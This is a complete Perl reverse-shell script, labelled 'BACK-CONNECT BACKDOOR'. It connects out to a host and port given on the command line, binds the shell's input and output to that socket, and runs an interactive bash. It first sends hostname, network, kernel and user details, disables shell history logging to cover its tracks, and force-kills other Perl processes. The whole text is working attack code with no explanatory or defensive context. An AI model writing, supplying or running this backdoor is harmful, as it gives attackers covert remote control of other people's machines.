#!/usr/bin/perl
use IO::Socket;
$system    = '/bin/bash -i';
$ARGC=@ARGV;
print "=====================\n";
print "BACK-CONNECT BACKDOOR\n";
print "=====================\n\n";
if ($ARGC!=2) {
   print "Usage: $0 [Host] [Port] \n\n";
   die "Ex: $0 127.0.0.1 80 \n";
}
use Socket;
use FileHandle;
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n";
connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n";
print "[*] Resolving HostName\n";
print "[*] Connecting... $ARGV[0] \n";
print "[*] Spawning Shell \n";
print "[*] Connected to remote $ARGV[0] \n\n";
SOCKET->autoflush();
open(STDIN, ">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");
print "==========================\n";
print "SUCCESSFULLY CONNECTED !!! \n";
print "==========================\n";
system("echo;hostname;/sbin/ifconfig | grep inet;echo;killall -9 perl");
system("unset HISTFILE; unset SAVEHIST;echo 'Systeminfo:' `uname -a`;echo 'Userinfo:' `id`;echo 'Directory:' `pwd`;echo");
system($system);
#EOF
